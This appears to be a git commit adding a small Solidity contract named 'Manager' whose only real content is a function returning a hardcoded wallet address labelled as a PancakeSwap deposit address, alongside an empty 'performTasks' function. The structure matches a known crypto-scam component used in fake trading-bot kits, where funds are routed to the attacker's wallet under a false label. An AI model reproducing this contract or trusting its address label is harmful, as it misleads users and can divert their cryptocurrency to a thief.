7face5e2555a602835f34c6478e10181bd90ab22
Pancakeloan <87273484+Pancakeloan@users.noreply.github.com>
2022-02-03 12:19:41 -0800

    Create VE.Project.6.08.sol

---
+++ VE.Project.6.08.sol
@@ -0,0 +1,13 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+    function performTasks() public pure{
+        
+    }
+    
+    function pancakeswapDepositAddress() public pure returns (address) {
+        return 0xed3338E153b9400D49F38ca7e73Ea337fdb3c723;
+    }
+}
+
+//pancakeswapfunction
